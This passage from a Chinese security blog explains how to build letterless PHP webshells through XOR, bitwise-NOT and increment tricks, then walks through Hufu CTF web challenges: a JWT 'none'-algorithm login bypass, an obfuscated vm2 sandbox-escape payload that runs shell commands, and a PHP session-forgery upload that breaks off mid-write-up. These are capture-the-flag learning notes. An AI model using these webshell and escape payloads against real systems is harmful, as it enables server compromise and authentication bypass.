olleH</span></span><br></pre></td></tr></table></figure></li><li><p>可变变量，即在一个字符串变量前再加一个 <code>$</code> 可将该变量的值当作变量名</p><blockquote><p>一个可变变量可以获取一个普通变量的值作为这个可变变量的变量名</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'hello'</span>;</span><br><span class="line">$$a = <span class="string">'world'</span>;</span><br><span class="line"><span class="keyword">echo</span> $hello; <span class="comment">// world</span></span><br><span class="line">$hello = <span class="string">'dlrow'</span>;</span><br><span class="line"><span class="keyword">echo</span> $$a; <span class="comment">// dlrow</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="0x02-思路分析及三种方法"><a href="#0x02-思路分析及三种方法" class="headerlink" title="0x02 思路分析及三种方法"></a>0x02 思路分析及三种方法</h2><p>我们需要将各种符号进行变换组合，最终构造出各种字母数字，以执行所需命令</p><p>大致思路为构造 <code>assert($_POST[_])</code> 获取 shell</p><p>这里说一下需要使用 PHP5 的原因</p><blockquote><p>PHP5 中 <code>assert</code> 为函数，可以通过 <code>$a=&#39;assert&#39;;$a(...)</code> 的方式执行，这也是之后选用 <code>assert</code> 而不选用 <code>eval</code> 的原因</p><p>PHP7 中 <code>assert</code> 变为了和 <code>eval</code> 一样的语言结构，即不能再用以上方法执行</p></blockquote><p>在这篇文章结尾我也会简要分析一下在 PHP7 中怎么操作</p><h3 id="法一：异或"><a href="#法一：异或" class="headerlink" title="法一：异或"></a>法一：异或</h3><blockquote><p>异或即 PHP 中的运算符 <code>^</code></p><p><code>$a ^ $b</code> Xor（按位异或） 将把 <code>$a</code> 和 <code>$b</code> 中一个为 1 另一个为 0 的位设为 1</p><p>两个字符串异或后仍是字符串</p></blockquote><p>这应该是这三种方法中最常用的一个（因为 Google 查到最多的是这种方法），具体选用哪些字符进行异或直接查 ASCII 码表就好（构造小写字母采用反引号 <code>`</code> ，构造大写字母采用 <code>@</code> 比较方便）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?code&#x3D;$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;);$__&#x3D;&#39;_&#39;.(&#39;%10&#39;^&#39;@&#39;).(&#39;%0F&#39;^&#39;@&#39;).(&#39;%13&#39;^&#39;@&#39;).(&#39;%14&#39;^&#39;@&#39;);$___&#x3D;$$__;$_($___[_]);</span><br></pre></td></tr></table></figure><p>整理一下即为以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = <span class="string">'assert'</span>;</span><br><span class="line">$__ = <span class="string">'_POST'</span>;</span><br><span class="line">$___ = $$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_])</span></span><br></pre></td></tr></table></figure><h3 id="法二：取反"><a href="#法二：取反" class="headerlink" title="法二：取反"></a>法二：取反</h3><blockquote><p>取反即 PHP 中的运算符 <code>~</code></p><p><code>~$a</code> Not（按位取反） 将 <code>$a</code> 中为 0 的位设为 1，反之亦然</p><p>字符串取反后仍是字符串</p></blockquote><p>在异或运算符 <code>^</code> 被过滤时可以考虑这种方法，也是招新 BOSS 题中用到的方法，依然查 ASCII 码表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?code&#x3D;$_&#x3D;~&#39;%9E%8C%8C%9A%8D%8B&#39;;$__&#x3D;~&#39;%AF%B0%ACAB&#39;;$___&#x3D;$$__;$_($___[_]);</span><br></pre></td></tr></table></figure><p>整理一下即与 0x02 中代码相同</p><p>另附一个将字符串转换成上述取反格式的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line">s = <span class="string">'assert'</span></span><br><span class="line">print(<span class="string">"~'"</span>, end=<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    i1 = hex(<span class="number">15</span> - int(hex(ord(i))[<span class="number">-2</span>], <span class="number">16</span>))[<span class="number">-1</span>].upper()</span><br><span class="line">    i2 = hex(<span class="number">15</span> - int(hex(ord(i))[<span class="number">-1</span>], <span class="number">16</span>))[<span class="number">-1</span>].upper()</span><br><span class="line">    print(<span class="string">'%'</span> + i1 + i2, end=<span class="string">''</span>)</span><br><span class="line">print(<span class="string">"'"</span>) <span class="comment"># ~'%9E%8C%8C%9A%8D%8B'</span></span><br></pre></td></tr></table></figure><h3 id="法三：字符递增"><a href="#法三：字符递增" class="headerlink" title="法三：字符递增"></a>法三：字符递增</h3><p>那么如果异或运算符和取反运算符都被过滤了该怎么办呢，这里就要用到递增运算符 <code>++</code></p><p>然而怎么获得用来递增的第一个字母，这用到了 PHP 的一个特性</p><blockquote><p>在试图将数组转换成字符串时会获得字符串 ‘Array’</p></blockquote><p>可以用以下代码演示这个特性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = [];</span><br><span class="line">$b = <span class="string">"$a"</span>;</span><br><span class="line"><span class="keyword">echo</span> $b; <span class="comment">// Array</span></span><br></pre></td></tr></table></figure><p>又由于 PHP 中函数名对大小写不敏感，我们可以构造 <code>ASSERT($_POST[_])</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?code&#x3D;$_&#x3D;[];$__&#x3D;&quot;$_&quot;;$___&#x3D;$__[&#39;@&#39;&#x3D;&#x3D;&#39;!&#39;];$_&#x3D;$___;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$____&#x3D;$___;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$_____&#x3D;$___;$___%2B%2B;$______&#x3D;$___;$___%2B%2B;$___%2B%2B;$_______&#x3D;$___;$___%2B%2B;$________&#x3D;$___;$___%2B%2B;$_________&#x3D;$___;$_&#x3D;$_.$________.$________.$____.$_______.$_________; $__&#x3D;&#39;_&#39;.$______.$_____.$________.$_________; $___&#x3D;$$__;$_($___[_]);</span><br></pre></td></tr></table></figure><p>整理即为以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = [];</span><br><span class="line">$__ = <span class="string">"$_"</span>; <span class="comment">// Array</span></span><br><span class="line">$___ = $__[<span class="string">'@'</span> == <span class="string">'#'</span>]; <span class="comment">// A</span></span><br><span class="line">$_ = $___; <span class="comment">// A</span></span><br><span class="line">$___++;$___++;$___++;$___++;</span><br><span class="line">$____ = $___; <span class="comment">// E</span></span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$_____ = $___; <span class="comment">// O</span></span><br><span class="line">$___++;</span><br><span class="line">$______ = $___; <span class="comment">// P</span></span><br><span class="line">$___++;$___++;</span><br><span class="line">$_______ = $___; <span class="comment">// R</span></span><br><span class="line">$___++;</span><br><span class="line">$________ = $___; <span class="comment">// S</span></span><br><span class="line">$___++;</span><br><span class="line">$_________ = $___; <span class="comment">// T</span></span><br><span class="line">$_ = $_.$________.$________.$____.$_______.$_________; <span class="comment">// ASSERT</span></span><br><span class="line">$__ = <span class="string">'_'</span>.$______.$_____.$________.$_________; <span class="comment">//POST</span></span><br><span class="line">$___ = $$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_])</span></span><br></pre></td></tr></table></figure><h2 id="0x03-PHP7-中可用的方法"><a href="#0x03-PHP7-中可用的方法" class="headerlink" title="0x03 PHP7 中可用的方法"></a>0x03 PHP7 中可用的方法</h2><ol><li><p>如果 web 用户有读写权限，可以直接用 <code>file_put_content</code> 函数将木马写入文件</p></li><li><p>如果无读写权限，可以用上述各种方法构造出自己需要的函数再执行，法三经过一定操作理论上可以构造出所有字母（大写和小写）和数字，小写字母和数字可以用以下方法再结合递增递减即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = [];</span><br><span class="line">$__ = <span class="string">"$_"</span>; <span class="comment">// Array</span></span><br><span class="line">$___ = $__[<span class="string">'@'</span> == <span class="string">'#'</span>]; <span class="comment">// A</span></span><br><span class="line">$_ = $___; <span class="comment">// A</span></span><br><span class="line">$___++;$___++;$___++;</span><br><span class="line">$____ = $___; <span class="comment">// D</span></span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$_____ = $___; <span class="comment">// O</span></span><br><span class="line">$___++;$___++;$___++;</span><br><span class="line">$______ = $___; <span class="comment">// R</span></span><br><span class="line">$_______ = $_____.$______.$____; <span class="comment">// ORD</span></span><br><span class="line">$________ = $_______($____) - $_______($_); <span class="comment">// 3 （数字在这）</span></span><br><span class="line">$____ = $__[$________]; <span class="comment">// a （小写字母在这）</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>咕了好久才想起来有篇博客没写完，结果这两天又遇到一次依然不会（就是用到了法三），跟在🐙爷爷后面<del>做</del>看完题才想起来，卧槽这个我看过（但是还没写</p><p>这个故事告诉我们，鸽子迟早是要被炖了的（逃</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虎符 CTF WEB 部分复现</title>
      <link href="/2020/04/22/hfctf-web/"/>
      <url>/2020/04/22/hfctf-web/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>当时比赛的时候，一共三道 WEB 题，两道 nodejs 的都不会，还有一道 PHP 没来得及看后来看了也不会（还是太菜了</p><p>趁题还热乎，借着 dalao 们的 WP 复现一波</p><h2 id="0x01-easy-login"><a href="#0x01-easy-login" class="headerlink" title="0x01 easy_login"></a>0x01 easy_login</h2><p>由于静态文件的配置问题，有一大波源码泄露（比赛时只看到了这个</p><p>只有 admin 可以看到 flag，而我们不能注册名为 admin 的用户，只能想办法伪造</p><p>题目都说了错的是依赖库，比赛的时候居然没注意到，这里的关键在于用了 jsonwebtoken 库，重点在登录的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'POST /api/login'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'username or password is necessary'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>重点在 jwt 库存在缺陷</p><blockquote><p>当加密时使用的是 none 方法，验证时只要密钥处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过</p></blockquote><p>我们只要使这里的 secret 为 undifined 或 null 即可，但 sid 不能为 undefined 或 null</p><p>测试发现，当数组索引为浮点数时，得到的结果为 undefined</p><img src="/2020/04/22/hfctf-web/list.jpg"><p>可以用 python 构造 token</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">print(jwt.encode(&#123;<span class="string">"secretid"</span>:<span class="number">0.1</span>,<span class="string">"username"</span>:<span class="string">"admin"</span>,<span class="string">"password"</span>:<span class="string">"123"</span>&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p>发送构造的 token 即可以 admin 身份登录，获得 flag</p><h2 id="0x02-just-escape"><a href="#0x02-just-escape" class="headerlink" title="0x02 just_escape"></a>0x02 just_escape</h2><p>看起来后缀是 php 实际上后端是 nodejs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;Error().stack;</span><br><span class="line"></span><br><span class="line">Error</span><br><span class="line">    at vm.js:1:1</span><br><span class="line">    at Script.runInContext (vm.js:131:20)</span><br><span class="line">    at VM.run (&#x2F;app&#x2F;node_modules&#x2F;vm2&#x2F;lib&#x2F;main.js:219:62)</span><br><span class="line">    at &#x2F;app&#x2F;server.js:51:33</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at next (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13)</span><br><span class="line">    at Route.dispatch (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at &#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22</span><br><span class="line">    at Function.process_params (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure><p>可以看到是用了 vm，GitHub 上有一个逃逸的 <a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">payload</a></p><p>但是这里过滤了一些关键字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for while process exec eval constructor prototype Function + &quot; &#39;</span><br></pre></td></tr></table></figure><p>根据 cg 的 payload，引号可以用 String.fromCharCode 绕过</p><p>这里给一个转成这个函数形式的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"return process"</span></span><br><span class="line">payload = <span class="string">"String.fromCharCode("</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    payload += str(ord(c)) + <span class="string">','</span></span><br><span class="line">payload = payload.strip(<span class="string">','</span>) + <span class="string">')'</span></span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><p>这里被过滤的方法名可以用 JavaScript 的另一种方法调用形式，即将方法名当作数组索引的形式加上 String.fromCharCode 绕过</p><img src="/2020/04/22/hfctf-web/bypass.jpg"><p>最终 paylaod 如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;Buffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;,&#123;getOwnPropertyDescriptor()&#123;<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="built_in">String</span>.fromCharCode(<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">114</span>)](<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>))();&#125;&#125;));&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="built_in">String</span>.fromCharCode(<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>))[<span class="built_in">String</span>.fromCharCode(<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">83</span>,<span class="number">121</span>,<span class="number">110</span>,<span class="number">99</span>)](<span class="built_in">String</span>.fromCharCode(<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>)).toString();&#125;&#125;)()</span><br></pre></td></tr></table></figure><p>成功获得 flag</p><h2 id="0x03-babyupload"><a href="#0x03-babyupload" class="headerlink" title="0x03 babyupload"></a>0x03 babyupload</h2><p>这个是真 PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">"/var/babyctf/"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"/flag"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] ===<span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">'/var/babyctf/success.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] =<span class="string">'guest'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">'direction'</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">'attr'</span>);</span><br><span class="line">$dir_path = <span class="string">"/var/babyctf/"</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">"private"</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">"/"</span>.$_SESSION[<span class="string">'username'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">"upload"</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid upload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$_FILES[<span class="string">'up_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_path .= <span class="string">"_"</span>.hash_file(<span class="string">"sha256"</span>,$_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">"uploaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">"download"</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">'filename'</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'file not exist'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">'Content-Type: application/force-download'</span>);</span><br><span class="line">        header(<span class="string">'Content-Length: '</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">'"'</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">"downloaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>重点在这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] ===<span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">'/var/babyctf/success.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要伪造 session 让自己变成 admin 并且需要创建 success.txt 文件</p><p>我们先读取一下 session，名为 sess_PHPSESSID 的文件</p><img src="/2020/04/22/hfctf-web/get_sess.jpg"><p>其内容如下</p><img src="/2020/04/22/hfctf-web/sess.jpg"><p>这里要知道 PHP session 序列化的形式（session.serialize_handler）</p><blockquote><p>php 键名 + 竖线 + 经过serialize()函数序列化处理的值</p><p>php_binary 键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数序列化处理的值</p><p>php_serialize（ php &gt;= 5.5.4 ）经过serialize()函数序列化处理的数组</p></blockquote><p>由于最前边有一个不可见字符，可以判断这里用的是 php_binary</p><p>我们发现最后上传的文件名是原文件名 + ‘_’ + 文件名的 SHA256 值，与 session 文件的文件名似乎有点相似</p><p>构造一个 php_binary 形式的 session 文件，username 为 admin，注意图中的不可见字符 08（或者用 PHP 直接生成也可以</p><img src="/2020/04/22/hfctf-web/sess_file.jpg"><p>计算一下该文件的 SHA256 值</p><img 